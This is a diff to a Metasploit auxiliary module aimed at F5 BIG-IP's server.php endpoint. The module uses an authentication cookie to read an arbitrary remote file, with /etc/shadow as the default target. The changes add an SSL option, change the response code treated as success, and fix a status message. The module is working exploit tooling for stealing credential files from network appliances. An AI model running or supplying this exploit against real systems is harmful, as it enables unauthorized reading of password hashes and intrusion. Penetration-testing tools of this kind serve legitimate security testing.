@@ -47,7 +47,8 @@ class Metasploit4 < Msf::Auxiliary
 			Opt::RPORT(443),
 			OptString.new('TARGETURI', [true, 'Path to F5 BIG-IP', '/sam/admin/vpe2/public/php/server.php']),
 			OptString.new('RFILE', [true, 'Remote File', '/etc/shadow']),
-			OptString.new('VALIDCOOKIE', [true, 'BIGIPAuthCookie value', ''])
+			OptString.new('VALIDCOOKIE', [true, 'BIGIPAuthCookie value', '']),
+			OptBool.new('SSL', [ true,  "Use SSL", true ])
 
 		], self.class)
 
@@ -94,12 +95,12 @@ class Metasploit4 < Msf::Auxiliary
 				'data'     => data,
 				})
 
-		if res and res.code == 500
+		if res and res.code == 200
 			case res.body
 			when /has sent unknown dialogueType/
 				loot = $1
 				if not loot or loot.empty?
-					print_status("#{rhost}#{rport} Retrieved empty file from #{rhost}:#{rport}")
+					print_status("#{rhost}:#{rport} Retrieved empty file from #{rhost}:#{rport}")
 					return
 				end
 				f = ::File.basename(datastore['RFILE'])
